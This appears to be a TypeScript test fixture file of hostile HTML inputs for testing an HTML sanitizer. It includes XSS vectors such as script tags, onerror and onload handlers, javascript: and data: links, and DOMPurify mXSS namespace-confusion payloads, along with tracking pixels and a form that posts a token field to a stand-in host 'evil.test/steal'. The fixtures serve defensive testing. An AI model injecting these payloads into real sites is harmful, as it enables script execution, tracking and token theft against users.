/** Hostile XSS, mXSS, tracking-pixel, and unsafe-URL HTML fixtures (1c-T02, 1c-T12). */

export const HOSTILE_XSS_FIXTURES = {
  scriptTag: `<p>Safe intro</p><script>window.__xssExecuted = true;</script><p>After</p>`,
  imgOnError: `<p>Check <img src="https://tracker.invalid/pixel.gif" alt="Hero Chart" onerror="window.__xssExecuted=true" /></p>`,
  svgOnLoad: `<svg onload="window.__xssExecuted=true"><script>alert(1)</script></svg><p>Kept</p>`,
  iframeSrcDoc: `<iframe srcdoc="<script>parent.__xssExecuted=true</script>"></iframe><p>Body</p>`,
  jsHref: `<a href="javascript:window.__xssExecuted=true">Click me</a>`,
  protocolRelativeHref: `<a href="//evil.example/phish">ProtoRel</a>`,
  dataUrlLink: `<a href="data:text/html,<script>alert(1)</script>">DataLink</a>`,
  inlineStyleAndClass: `<p style="background:url(https://evil.test/track)" class="fixed inset-0 bg-red-500" id="location" name="top">Styled</p>`,
  formAction: `<form action="https://evil.test/steal"><input name="tok" /><button formaction="javascript:alert(1)">Go</button></form>`,
  relativeLink: `<p>Read <a href="/2026/11/post?id=42">full post</a> and <img src="/images/fig1.png" alt="Figure 1" /></p>`,
  pictureElement: `<picture><source srcset="https://tracker.invalid/hi.webp" /><img src="https://tracker.invalid/lo.jpg" alt="Diagram" /></picture>`,
  dataImgNoAlt: `<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=" />`,
  dataImgWithAlt: `<img src="data:image/png;base64,AAAA" alt="Inline chart" />`,
  // Classic DOMPurify mXSS namespace confusion vectors (U-13)
  mxssMathMglyph: `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=window.__xssExecuted=1&gt;">`,
  mxssNoscript: `<noscript><p title="</noscript><img src=x onerror=window.__xssExecuted=1>">fallback</p></noscript>`,
  mxssFormMath: `<form><math><mtext></form><form><mglyph><style></math><img src onerror=window.__xssExecuted=1>`,
} as const;
